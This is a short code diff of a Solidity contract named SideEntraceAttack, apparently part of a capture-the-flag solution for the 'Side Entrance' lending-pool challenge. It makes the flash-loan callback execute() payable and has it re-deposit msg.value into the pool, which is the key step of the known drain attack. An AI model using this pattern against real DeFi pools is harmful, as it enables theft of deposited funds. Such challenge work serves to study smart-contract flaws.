@@ -37,12 +37,12 @@ contract SideEntraceAttack {
         
     }
 
-    function execute(uint256 amount) external {
+    function execute() external payable{
          pool.functionCallWithValue(
             abi.encodeWithSignature(
                 "deposit()"
             ),
-            amount
+            msg.value
         );
                 //address(pool).deposit().sendValue(amount);
     }
